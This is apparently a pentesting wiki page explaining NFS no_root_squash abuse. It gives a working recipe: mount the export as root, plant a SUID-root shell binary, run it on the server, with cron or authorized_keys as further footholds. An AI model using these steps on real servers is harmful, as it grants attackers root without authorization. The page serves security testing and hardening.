---
title: "no_root_squash abuse: acting as root on an NFS export"
description: "By default NFS maps a client's root (UID 0) to an unprivileged user (root squash). An export set with no_root_squash disables that, so a client mounting it as root creates and modifies files as real root on the server. The standard abuse writes a root-owned SUID binary to the export, then executes it on the server for local root."
keywords:
  - no_root_squash
  - root squash
  - suid
  - nfs
  - privilege escalation
---

# no_root_squash abuse

NFS normally protects the server by squashing a remote root: a request arriving with UID 0 is remapped to an unprivileged user (`nobody`), so a client cannot act as root on the export. When an export is configured with `no_root_squash`, that remapping is off, and a client that mounts the export while being root locally creates and modifies files as real UID 0 on the server. The classic escalation is to write a root-owned SUID executable into the export; because the file is genuinely owned by root on the server, running it there (by any local user or a separate foothold) yields root.

## The technique

```bash
# 1. mount the no_root_squash export as local root on the attacker machine
mount -t nfs -o vers=3 <target>:/srv/share /mnt/nfs
# 2. write a SUID-root shell helper into the export, as root
cat > /mnt/nfs/.s.c <<'C'
#include <unistd.h>
int main(){ setuid(0); setgid(0); execl("/bin/sh","sh",0); }
C
gcc -static /mnt/nfs/.s.c -o /mnt/nfs/.s
chown root:root /mnt/nfs/.s       # succeeds because root is not squashed
chmod 4755 /mnt/nfs/.s            # SUID root, owned by root on the server
# 3. on the server (or any foothold there), run it to become root
/path/on/server/.s                # -> root shell
```

The write and `chown root` succeed only because `no_root_squash` lets your UID 0 be honoured; the SUID bit then grants root to whoever runs the binary on the server. A statically linked helper avoids library-path issues on the target.

## Exploitation notes

- This needs both `no_root_squash` on the export and the ability to execute the planted binary on the server, from an existing low-privilege foothold on the server, or any mechanism that runs files from the export.
- Test for `no_root_squash` by mounting as root and attempting `chown root:root` on a file you create; success means the option is set.
- If you cannot execute on the server directly, a SUID binary still helps a separate foothold; alternatively write into a root-owned location (cron, authorized_keys) that the server itself acts on.
- Where only `all_squash` or `root_squash` is set, this fails and you fall back to [UID and GID spoofing](uid-and-gid-spoofing.md) for non-root identities.

## References

- [exports(5): root_squash / no_root_squash](https://man7.org/linux/man-pages/man5/exports.5.html)
- [HackTricks: NFS no_root_squash](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
